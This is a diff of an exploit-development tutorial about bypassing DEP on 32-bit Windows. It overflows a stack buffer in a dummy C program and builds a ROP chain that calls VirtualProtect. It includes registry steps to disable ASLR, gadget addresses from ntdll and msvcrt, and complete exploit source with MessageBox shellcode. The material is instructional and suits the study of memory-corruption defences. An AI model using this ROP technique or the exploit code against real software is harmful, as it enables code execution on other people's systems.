@@ -4,13 +4,13 @@ This is the part one of the "Bypassing Windows security mitigations" series. In 
 
 This is the list of requirements being these related to software and user base skills.
 
-|Requirements            |
-|------------------------|
-|Windows 32 bits      |
-|OllyDbg                 |
-|Dev-Cpp + GCC compiler*  |
-|Basic ASM skills         |
-|Patience                 |
+| Requirements            |
+| ----------------------- |
+| Windows 32 bits         |
+| OllyDbg                 |
+| Dev-Cpp + GCC compiler* |
+| Basic ASM skills        |
+| Patience                |
 
 *Last version is 5.11 from 2015. This IDE is a nice alternative for Visual Studio for dev in C/C++.
 
@@ -64,10 +64,10 @@ int main (int argc, char **argv){
 
 Before printme(buf) the stack can be viewed as:
 
-|Stack              |
-|-------------------|
-|ESP-> buf|
-|main_ebp|
+| Stack     |
+| --------- |
+| ESP-> buf |
+| main_ebp  |
 
 When printme(buf) is reached it will perform a:
 
@@ -93,16 +93,16 @@ CALL strcpy
 
 Before calling strcpy, the stack will contain:
 
-|Stack              |
-|-------------------|
-|tmp_ptr|
-|buf_ptr|
-|tmp|
-|printme_ebp|
-|return_address|
-|buf_ptr|
-|buf|
-|main_ebp|
+| Stack          |
+| -------------- |
+| tmp_ptr        |
+| buf_ptr        |
+| tmp            |
+| printme_ebp    |
+| return_address |
+| buf_ptr        |
+| buf            |
+| main_ebp       |
 
 strcpy() will put all the data of buf in tmp, as a consequence if you write more data (bytes) than tmp can't handle an overflow will happen. Here comes the funny part, the last stack view tell us that tmp is above printme_ebp and return_address. These two take 4 bytes each so you only need to overwrite 8 bytes after you fill up tmp with whatever you want.
 
@@ -138,11 +138,11 @@ int main (int argc, char **argv){
 ```
 Before printme() returns the stack will look like:
 
-|Stack              |
-|-------------------|
-|58585858 (4 bytes = 8 hex, 58_h=X)|
-|58585858|
-|58585858|
+| Stack                              |
+| ---------------------------------- |
+| 58585858 (4 bytes = 8 hex, 58_h=X) |
+| 58585858                           |
+| 58585858                           |
 |58585858| (printme_ebp)
 |58585858 (return_address)|
 |buf_ptr|
@@ -174,11 +174,11 @@ BOOL WINAPI VirtualProtect(
 
 Yeah seems cool but... how can I chain these gadgets and trigger the execution of the ROP chain? Remember the previous stack view? Well the return address should be overwritten with the address of the first gadget. Then the first gadget will perform and return into the second gadget and so on. Until calling VirtualProtect.
 
-|Stack              |
-|-------------------|
-|58585858 (tmp)|
-|58585858|
-|58585858|
+| Stack          |
+| -------------- |
+| 58585858 (tmp) |
+| 58585858       |
+| 58585858       |
 |58585858| (printme_ebp)
 |gadget_1 (return_address)|
 |gadget_2|
@@ -201,59 +201,99 @@ If ASLR is enabled then ASLR_offset=rand and the gaget_address will change on ev
 
 It's desirable that you disable ASLR or you will have to find every gadget address after each reboot due to ASLR rebasing base addresses. To disable ASLR on Windows follow these steps:
 
-## How do I use a Debugger to create a reliable exploit and spawn my shellcode?
+Create a DWORD value named MoveImages in the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management with value 0. Then reboot and ASLR will be turned off. It's the turn to use OllyDbgr and browse modules instructions.
+
+## Common mistakes made when building ROP chains
 
 At this point you should have seen how to take advantage of a Buffer Overflow to overwrite the return address of the current stack frame. Also, you learnt that DEP will trigger, and prevent any attempt of execution, since the stack is marked as non-executable. Then you understood that bypassing DEP means to mark the stack as executable, so you are now trying to locate some juicy gadgets to chain and achieve a call to VirtualProtect that marks stack as executable. This last step is what is covered here.
 
 A very common mistake made by beginners is to attempt to build the stack with VirtualProtect parameters using Push + ret gadgets. Imagine your first gadget wants to push the last argument of VirtualProtect (dwOld). Since dwOld is a pointer to an address, you can use ESP.
 
-|Stack|
-|-----|
-|EIP->gadget_1|
-|gadget_2|
+| Stack         |
+| ------------- |
+| EIP->gadget_1 |
+| gadget_2      |
 
 ```nasm
 gadget_1:
-PUSH ESP ; push ptr to add (dwOld)
+PUSH ESP ; push ptr to stack (dwOld)
 RET ; return to what is on dwOld
 ```
-|Stack|
-|-----|
-|gadget_1|
-|EIP->dwOld|
-|gadget_2|
+| Stack      |
+| ---------- |
+| gadget_1   |
+| EIP->dwOld |
+| gadget_2   |
 
-Now you have broken the ROP chain calling an address outside the chain. This is not desirable, chain order should be respected.
-What we want to achieve is the stack to look like:
+Now you have broken the ROP chain calling an address outside the chain. This is not desirable, undefined behaviour will occur. Chain order should be always respected.
 
-|Stack|
-|-----|
-|VirtualProtect|
-|lpAddress|
-|dwSize|
-|MEM_CONST|
-|dwOld|
-|shellcode|
+Another common mistake is to not place junk or valid pointer/data when a pop reg is met. The initial stack is the following:
+
+| Stack         |
+| ------------- |
+| EIP->gadget_1 |
+| gadget_2      |
+| gadget_3      |
+
+if the selected gadget (that's gadget_1) for example is:
+
+```asm
+ADD EAX, 40
+POP EBP
+RETN
+```
+
+| Stack                    |
+| ------------------------ |
+| gadget_1                 |
+| gadget_2 (popped on EBP) |
+| EIP->gadget_3            |
+
+gadget_2 adress will be popped into EBP and RETN will jump to gadget_3. What happened? we broke the chain since gadget_2 won't be executed.
+
+To avoid popping gadgets into registers you need to use junk like '41414141' (i.e four A's). Sometimes pop reg instructions are useful to place pointer to functions inside a registers, even fixed values. Once junk is added stack looks this way:
+
+| Stack                    |
+| ------------------------ |
+| EIP->gadget_1            |
+| 41414141 (popped on EBP) |
+| gadget_2                 |
+| gadget_3                 |
+
+when gadget_1 finishes EBP will contain 41414141 and RETN will jump to gadget_2. Chain is executing correctly in order!
+
+When all the gadgets of the chain finish execution the stack will look similar too:
+
+| Stack               |
+| ------------------- |
+| EIP->VirtualProtect |
+| lpAddress           |
+| dwSize              |
+| MEM_CONST           |
+| dwOld               |
+| shellcode           |
+
+And I say similar since some registers must be set to NOP ROPs, but this will be discussed later. This is just a simple approach to you, here you learn the order of the stack params after the last gadget execution. What is true is that VirtualProtect is going to be called and has all the parameters in order.
 
 The key here is to setup registers and push them all at same time, this is a PUSHAD + RET gadget on the bottom of the chain.
 
 PUSHAD: Push EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI
 
-Can you recall?
+PUSHAD will push EDI first then ESI etc. Then VirtualProtect address must be on EDI, lpAddress on ESI. This isn't true for my schema, as discussed later, but this is an introduciton to why use these registers, since PUSHAD pushes them in this order.
 
-|Stack|
-|-----|
-|EDI->VirtualProtect|
-|ESI->lpAddress|
-|EBP->dwSize|
-|original ESP->MEM_CONST|
-|EBX->dwOld|
-|EDX|
-|ECX|
-|EAX|
-|shellcode|
+| Stack                   |
+| ----------------------- |
+| EDI->VirtualProtect     |
+| ESI->lpAddress          |
+| EBP->dwSize             |
+| original ESP->MEM_CONST |
+| EBX->dwOld              |
+| EDX                     |
+| ECX                     |
+| EAX                     |
+| shellcode               |
 
-Okay what we can learn from the previous stack view? EDX, ECX and EAX are unused and original ESP is used for dwOld parameter. Shellcode address must be on EBX when PUSHAD is made, so before PUSHAD's gadget ESP must be pushed and popped to a register then moved to EBX, or done directly by pop EBX/MOV EBX, ESP. 
+Okay what we can learn from the previous stack view? EDX, ECX and EAX are unused and original ESP is used for dwOld parameter.  Shellcode address must be on ESI when PUSHAD is made, so before PUSHAD's gadget ESP must be pushed and popped to a register then moved to ESI, or done directly by PUSH ESP+POP ESI/MOV ESI, ESP. 
 
 My experience is that these instructions hardly exist inside the program's binary, a trick to handle this is to take advantage of original ESP to point to shellcode address (lpAddress), when PUSHAD is made ESP points to shellcode, this is the most important thing to remember. However original ESP is used for MEM_CONST, we need to reorganize the stack to place lpAddress on ESP. Let's use NOP ROPs, these are just RET gadgets.
 
@@ -261,49 +301,73 @@ My experience is that these instructions hardly exist inside the program's binar
 RET ; This is a NOP ROP
 ```
 
-|Stack|
-|-----|
-|EDI->NOP ROP|
-|ESI->VirtualProtect|
-|EBP->NOP ROP|
-|original ESP->lpAddress|
-|EBX->dwSize|
-|EDX->MEM_CONST|
-|ECX->dwOld|
-|EAX|
-|shellcode|
+| Stack                   |
+| ----------------------- |
+| EDI->NOP ROP            |
+| ESI->VirtualProtect     |
+| EBP->NOP ROP            |
+| original ESP->lpAddress |
+| EBX->dwSize             |
+| EDX->MEM_CONST          |
+| ECX->dwOld              |
+| EAX                     |
+| shellcode               |
 
-If we managed to setup registers this way, after PUSHAD + RET the first two ROP NOP will be executed until VirtualProtect call is hit. VirtualProtect will work as expected marking lpAddress (shellcode) as executable in the stack. Then VirtualProtect will return onto what is on EAX (pointer to our shellcode), and shellcode will be run. As you noticed NOP ROPs help a lot when dealing with shellcode pointer placement into lpAddress parameter.
+If we managed to setup registers this way, after PUSHAD + RET the first NOP ROP will execute, then VirtualProtect, then second NOP ROP, then return to EAX. To EAX since VirtualProtect used all parameters and EAX remains unused. Summarizing, after VirtualProtect, program returns to what is on EAX (PUSH ESP + RET), and shellcode will run. 
 
-Now we just need to know where to locate these gadgets inside executable's modules. In the last stackview you can see which register holds each parameter. Remember that if ASLR is enabled these addresses will change on every reboot, first lets turn off ASLR:
+VirtualProtect will work as expected marking lpAddress (shellcode) as executable in the stack. Then As you noticed NOP ROPs help a lot when dealing with shellcode pointer placement into lpAddress parameter.
 
-Create a DWORD value named MoveImages in the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management with value 0. Then reboot and ASLR will be turned off. It is turn to use the debugger and browse modules instructions.
+Now we just need to know where to locate these gadgets inside executable's modules. In the last stackview you can see which register holds each parameter. Remember that if ASLR is enabled these addresses will change on every reboot.
 
-## Using the Debugger
+## Using the Debugger to build a ROP Chain
 
 Load the executable into OllyDbg, now lets examine printme() code:
 
 ```nasm
-
+00401500  /$ 55             PUSH EBP
+00401501  |. 89E5           MOV EBP,ESP
+00401503  |. 83EC 28        SUB ESP,28
+00401506  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |
+00401509  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
+0040150D  |. 8D45 EE        LEA EAX,DWORD PTR SS:[EBP-12]            ; |
+00401510  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
+00401513  |. E8 70830100    CALL <JMP.&msvcrt.strcpy>                ; \strcpy
+00401518  |. C9             LEAVE
+00401519  \. C3             RETN
 ```
-ESP will point to tmp address, and ESP+4 to our buffer. When overflow happens we control return address (EIP). This address must be a valid gadget address, for example dwSize, must be the size of the shellcode On ASM making INC EBX 40 times will suffice. Also MEM_CONST must be 0x40 (PAGE_EXECUTE_READWRITE), adding 40 to EAX will do it. Lets find these instructions on loaded DLLs with OllyDbg.
+ESP will point to tmp address (EBP-12), and ESP+4 to our buffer. When overflow happens we control return address (EIP). This address must be a valid gadget address, for example dwSize, must be the size of the shellcode On ASM making INC EBX 40 times will suffice. Also MEM_CONST must be 0x40 (PAGE_EXECUTE_READWRITE), adding 40 to EAX then mov to EDX will do it. Lets find these instructions on loaded DLLs with OllyDbg.
 
-Everytime the executable is loaded, several DLLs are loaded, these are the runtime C DLL (msvcrt) and WinAPI DLLs (ntdll (syscalls), kernel32, kernelBase...). This means that all aplications use these, so locating gadgets here can be very useful to reuse gadgets across multiple executables.
+Everytime the executable is loaded, several DLLs are loaded, i.e: runtime C DLL (msvcrt) and WinAPI DLLs (ntdll (syscalls), kernel32, kernelBase...). This means that all aplications use these, so locating gadgets here can be very useful to reuse gadgets across multiple executables.
 
 Press Ctrl+E to view current loaded modules:
 
 
-Select ntdll and press Ctrl+S (search for multiple instructions). Lets find an INC instruction followed by a ret:
+|Base       |Size       |Entry      |Name       |File version       |Path                                   |
+------------|-----------|-----------|-----------|-------------------|---------------------------------------|
+|00400000   |000E5000   |004014E0   |Dummy      |                   |C:\Users\kub0x\Desktop\Dummy\Dummy.exe |
+|0DCE0000   |0004A000   |0DCE7DE0   |KERNELBA   |6.1.7600.16385     |C:\Windows\system32\KERNELBASE.dll     |
+|6FF50000   |000AC000   |6FF5A472   |msvcrt     |7.0.7600.16385     |C:\Windows\system32\msvcrt.dll         |
+|77DE0000   |000D4000   |77E2BDE4   |kernel32   |6.1.7600.16385     |C:\Windows\system32\kernel32.dll       |
+|77EC0000   |0013C000   |           |ntdll      |6.1.7600.16385     |C:\Windows\SYSTEM32\ntdll.dll          |
 
+Select ntdll and press Ctrl+S (search for multiple instructions). Lets find an INC EBX instruction followed by a ret:
 
-As seen, this is quite easy with the help of multiple search, also you can take more advantage of it, you will sometimes need to move values between registers. Imagine you have MEM_CONST on EAX (0x40), but you really need it on EDX, so try to get an instruction like, :
+```nasm
+G1:
+		77EF8450   43               INC EBX
+		77EF8451   C3               RETN
+```
+
+Hit enter and you will arrive at 0x77EF8450, write it down somewhere in your notes and call it G1. Congrats, now you have a gadget to increase EBX, this is increment dwSize until hit shellcode size. Remember that you have to turn off ASLR for having the same Virtual Address Space as on this article.
+
+As seen, this is quite easy with the help of multiple search, also you can take more advantage of it, sometimes you need to move values between registers. Imagine you have MEM_CONST on EAX (0x40), but you really need it on EDX, so try to get an instruction like, :
 
 ```nasm
 MOV EDX, EAX
 ANY n
 RET
 ```
-Any covers the case where n (must be a number) instructions are between MOV and RET. Also you can use:
+ANY covers the case where n (ranges from 1 to 8) instructions are between MOV and RET. Also you can use:
 
 ```nasm
 PUSH EAX
@@ -313,25 +377,152 @@ RET
 ```
 Now you have the value of EAX in one of the registers. r32 will be revealed once you hit 'Find'. When you discover what register it is, just find another gadget that moves that register to EDX. I compare ROP chain to solving puzzles, multiple ways but the same result.
 
-## The Exploit and the ROP chain together:
+In the case of EAX, you can place MEM_CONST (0x40 value) there, first make EAX zero (XOR EAX, EAX), then add 40 and move it to EDX. This is summarized into three gadgets G2, G3 and G4:
 
-Recall the stack view that must be present after PUSHAD (last gadget) and before calling VirtualProtect:
+```asm
+G2:
+		6FF5DC4D   33C0             XOR EAX,EAX
+		6FF5DC4F   C3               RETN
+G3:
+		77F8C22E   83C0 40          ADD EAX,40
+		77F8C231   5D               POP EBP
+		77F8C232   C3               RETN
+G4:
+		77EF5B6C   8BC8             MOV ECX,EAX
+		77EF5B6E   8BC2             MOV EAX,EDX
+		77EF5B70   8BD1             MOV EDX,ECX
+		77EF5B72   C3               RETN
+```
+
+Well done. We have setup EBX (dwSize) and EDX (MEM_CONST). Let's setup now ECX this is dwOld a pointer to the previous MEM_CONST value. Since it's a pointer, we can use ESP for this purpose, ESP is a pointer to the top of the stack.
+
+A naive attempt would be to look for a gadget that contains PUSH ESP and expect to find a POP ECX few instructions below followed by a RET.
+
+```nasm
+PUSH ESP
+Any n
+POP ECX
+Any n
+RET
+```
+
+Any ranges from 1 to 8. In my opinion I don't like to be n > 4.
+
+Naive attempts still continue, you can try to look for:
+
+```nasm
+MOV ECX, ESP
+ANY n
+RET
+```
+
+Even you can introduce more difficulty:
+
+```nasm
+MOV r32, ESP
+ANY n
+MOV ECX, r32
+ANY n
+RET
+```
+
+And pray for r32 on the two MOVs to be the same register. Same applies to POP instructions with two r32 expressions.
+
+In my case, I found the following gadget to PUSH ESP and move it to ECX in 3 gadgets:
+
+```nasm
+G5:
+		77F62992   54               PUSH ESP
+		77F62993   8BC7             MOV EAX,EDI
+		77F62995   5F               POP EDI ;Junk
+		77F62996   5E               POP ESI ;Junk
+		77F62997   5D               POP EBP ;NOP ROP
+		77F62998   C2 0400          RETN 4
+G6:
+		6FF7992D   8BC7             MOV EAX,EDI
+		6FF7992F   5F               POP EDI ;NOP ROP
+		6FF79930   C3               RETN
+G7:
+		77EF475D   8BC8             MOV ECX,EAX
+		77EF475F   8BC6             MOV EAX,ESI
+		77EF4761   5E               POP ESI ;VirtualProtect Address
+		77EF4762   C2 1000          RETN 10
+```
+
+Pushes ESP onto stack (dwOld param), pops it into EDI, moves EDI into EAX and finally EAX is moved into ECX. Now we have dwOld parameter on ECX. We are closer to finish our ROP chain.
+
+On G5 junk is popped onto EDI and ESI and NOP ROP on EBP. On G6 a NOP ROP is popped to EDI and finally on 67 VirtualProtect's Address is popped onto ESI.
+
+As I said before, VirtualProtect returns to what's on EBP, since EBP is a NOP ROP, this is a plain RET instruction, then returns to what's on EAX. EAX must be a PUSH ESP + RET gadget, since ESP points to our shellcode in this moment.
+
+```asm
+		6FF8606D   54               PUSH ESP
+		6FF8606E   C3               RETN
+```
+
+We need to pop 0x6FF8606D onto EAX. Find a gadget POP EAX + RET
+
+```nasm
+G8:
+		6FF8181F   58               POP EAX
+		6FF81820   C3               RETN
+```
+
+Alright, all registers are setup now. Let's push them onto stack with PUSHAD. Find a PUSHAD + RET gadget:
+
+```asm
+G9:
+		6FFB5CF4   60               PUSHAD
+		6FFB5CF5   C3               RETN
+```
+
+after PUSHAD the stack looks like this:
+
+| Stack                   |
+| ----------------------- |
+| EDI->NOP ROP            |
+| ESI->VirtualProtect     |
+| EBP->NOP ROP            |
+| original ESP->lpAddress |
+| EBX->dwSize             |
+| EDX->MEM_CONST  |
+| ECX->dwOld              |
+| EAX->PUSH+RET       |
+| shellcode                   |
+
+This is the ROP Chain I've built. After strcpy, when overflow happens, we overflow with junk until hit the return address, there we put our ROP Chain. The stack on my schema before ROP execution is:
 
 |Stack|
-|-----|
-|EDI->NOP ROP|
-|ESI->VirtualProtect|
-|EBP->NOP ROP|
-|original ESP->lpAddress|
-|EBX->dwSize|
-|EDX->MEM_CONST|
-|ECX->dwOld|
-|EAX|
-|shellcode|
+|-------|
+|G1|
+|G2|
+|G3|
+|Junk|
+|G4|
+|G5|
+|junk|
+|NOP ROP|
+|G6|
+|Junk|
+|NOP ROP|
+|G7|
+|VirtualProtect Address|
+|G8|
+|junk|
+|junk|
+|junk|
+|junk|
+|PUSH ESP+RET|
+|G9 (PUSHAD + RET)|
+
+Junks are used for the POP REG instructions, so the following gadgets are not popped and chain order is followed correctly. I've explained this before on the common mistakes section.
+
+## The Exploit and the ROP chain together:
 
 At this point you are familiarized with ROP chaining concept, besides you can locate useful gadgets inside loaded modules (DLLs). In addition you know the register's order to perform the VirtualProtect call (it is on the stackview above). It's your work now to complete the rest of the exploit, it is easy but challenging if it's your first time, I've only gave one gadget explanation, but I'm giving the whole ROP chain and C source, so you can understand and debug it step by step. You will notice how the chain is followed until PUSHAD.
 
 ```c
+#include <windows.h>
 #include <string.h>
 
 /* STACK SHOULD BE THIS WAY AFTER STRCPY AND BEFORE ROP EXECUTION
@@ -343,46 +534,82 @@ This form guarantees explotaiton since VProtect will mark SHCode as executable a
 
 NOP ROP, VProtect, NOP ROP, shellcodeptr, dwsize, memconst, oldvalue, PUSH ESP+RET, shellcode 
 */
-/*
-G1:
-77EF8450   43               INC EBX
-77EF8451   C3               RETN
-G2:
-6FF5DC4D   33C0             XOR EAX,EAX
-6FF5DC4F   C3               RETN
-G3:
-77F8C22E   83C0 40          ADD EAX,40
-77F8C231   5D               POP EBP
-77F8C232   C3               RETN
-G4:
-77EF5B6C   8BC8             MOV ECX,EAX
-77EF5B6E   8BC2             MOV EAX,EDX
-77EF5B70   8BD1             MOV EDX,ECX
-77EF5B72   C3               RETN
-G5:
-77F62992   54               PUSH ESP
-77F62993   8BC7             MOV EAX,EDI
-77F62995   5F               POP EDI
-77F62996   5E               POP ESI
-77F62997   5D               POP EBP
-77F62998   C2 0400          RETN 4
-G6:
-6FF7992D   8BC7             MOV EAX,EDI
-6FF7992F   5F               POP EDI
-6FF79930   C3               RETN
-G7:
-77EF475D   8BC8             MOV ECX,EAX
-77EF475F   8BC6             MOV EAX,ESI
-77EF4761   5E               POP ESI
-77EF4762   C2 1000          RETN 10
-G8:
-6FF8181F   58               POP EAX
-6FF81820   C3               RETN
-G9:
-6FFB5CF4   60               PUSHAD
-6FFB5CF5   C3               RETN
+
+/* ROP CHAIN
+		G1:
+		77EF8450   43               INC EBX
+		77EF8451   C3               RETN
+		G2:
+		6FF5DC4D   33C0             XOR EAX,EAX
+		6FF5DC4F   C3               RETN
+		G3:
+		77F8C22E   83C0 40          ADD EAX,40
+		77F8C231   5D               POP EBP
+		77F8C232   C3               RETN
+		G4:
+		77EF5B6C   8BC8             MOV ECX,EAX
+		77EF5B6E   8BC2             MOV EAX,EDX
+		77EF5B70   8BD1             MOV EDX,ECX
+		77EF5B72   C3               RETN
+		G5:
+		77F62992   54               PUSH ESP
+		77F62993   8BC7             MOV EAX,EDI
+		77F62995   5F               POP EDI
+		77F62996   5E               POP ESI
+		77F62997   5D               POP EBP
+		77F62998   C2 0400          RETN 4
+		G6:
+		6FF7992D   8BC7             MOV EAX,EDI
+		6FF7992F   5F               POP EDI
+		6FF79930   C3               RETN
+		G7:
+		77EF475D   8BC8             MOV ECX,EAX
+		77EF475F   8BC6             MOV EAX,ESI
+		77EF4761   5E               POP ESI
+		77EF4762   C2 1000          RETN 10
+		G8:
+		6FF8181F   58               POP EAX
+		6FF81820   C3               RETN
+		G9:
+		6FFB5CF4   60               PUSHAD
+		6FFB5CF5   C3               RETN
 
 */
+
+/*  IMPORTANT INSTRUCTIONS AND ADDRESSES:
+
+		After VirtualProtect it returns to whatever is on EAX, must jump to our shellcode:
+		
+		6FF8606D   54               PUSH ESP
+		6FF8606E   C3               RETN
+		
+		NOP ROP -> 6FFB5CF5   C3    RETN
+		
+		VirtualProtect -> 0x0DD022BD
+	
+		MessageBox -> 0x77D6EA11
+
+*/
+
+/*  Shellcode in ASM:
+	    
+		XOR EAX, EAX
+		PUSH EAX
+		PUSH 0x21216465
+		PUSH 0x6E776F70
+		MOV EBX, ESP
+		PUSH EAX
+		PUSH EBX
+		PUSH EBX
+		PUSH EAX
+		MOV EAX, 0x77D6EA11
+		CALL EAX
+		
+		To get opcodes paste it into https://defuse.ca/online-x86-assembler.html
+		
+		C-string: "\x31\xC0\x50\x68\x65\x64\x21\x21\x68\x70\x6F\x77\x6E\x89\xE3\x50\x53\x53\x50\xB8\x11\xEA\xD6\x77\xFF\xD0"
+*/
+
 
 void printme(char *buf){
 	char tmp[10];
@@ -390,6 +617,9 @@ void printme(char *buf){
 }
 
 int main(int argc, char** argv) {
+	//If we want to spawn a MsgBox we need user32.dll
+	//Could ASM-Pinvoke though
+	LoadLibraryA("user32.dll");
 	char *buf="AAAAAAAAAAAAAAAAAA"
 	"\x50\x84\xEF\x77" //G1
 	"\x50\x84\xEF\x77" //G1
@@ -416,25 +646,26 @@ int main(int argc, char** argv) {
 	"\x50\x84\xEF\x77" //G1
 	"\x50\x84\xEF\x77" //G1
 	"\x50\x84\xEF\x77" //G1
-	"\x2E\xC2\x34\x77" //G3
+	"\x4D\xDC\xF5\x6F"//G2
+	"\x2E\xC2\xF8\x77" //G3 77F8C22E
 	"\x41\x41\x41\x41" //junk
-	"\x6C\x5B\x2B\x77" //G4 
-	"\x92\x29\x32\x77" //G5
+	"\x6C\x5B\xEF\x77" //G4 77EF5B6C
+	"\x92\x29\xF6\x77" //G5 77F62992
 	"\x41\x41\x41\x41" //junk
-	"\xF5\x5C\x33\x76" //ROP NOP
-	"\x2D\x99\x2F\x76" //G6
+	"\xF5\x5C\xFB\x6F" //NOP ROP 6FFB5CF5
+	"\x2D\x99\xF7\x6F" //G6 6FF7992D
 	"\x41\x41\x41\x41" //junk
-	"\xF5\x5C\x33\x76" //ROP NOP
-	"\x89\xA6\x2D\x76" //G7
-	"\xBD\x22\x50\x75" //Vprotect
-	"\x1f\x18\x30\x76" //G8
-	"\x41\x41\x41\x41" //junk
-	"\x41\x41\x41\x41" //junk
+	"\xF5\x5C\xFB\x6F" //NOP ROP 6FFB5CF5
+	"\x5D\x47\xEF\x77" //G7 77EF475D
+	"\xBD\x22\xD0\x0D" //Vprotect 77E22341
+	"\x1F\x18\xF8\x6F" //G8 6FF8181F
 	"\x41\x41\x41\x41" //junk
 	"\x41\x41\x41\x41" //junk
-	"\x6D\x60\x30\x76" //push esp + ret for eax
-	"\xF4\x5C\x33\x76" //PUSHAD
-	"\x68\x2D\x10\xE8\xB5\xC5\x2E\x76"; //Our shellcode that will be called after Vprotect rets on pushed EBP
+	"\x41\x41\x41\x41" //junk
+	"\x41\x41\x41\x41" //junk
+	"\x6D\x60\xF8\x6F" //push esp + ret for eax 6FF8606D
+	"\xF4\x5C\xFB\x6F" //PUSHAD 6FFB5CF4
+	"\x31\xC0\x50\x68\x65\x64\x21\x21\x68\x70\x6F\x77\x6E\x89\xE3\x50\x53\x53\x50\xB8\x11\xEA\xD6\x77\xFF\xD0"; //Our shellcode that will be called after Vprotect rets on pushed EBP
 	printme(buf);
 	return 0;
 }
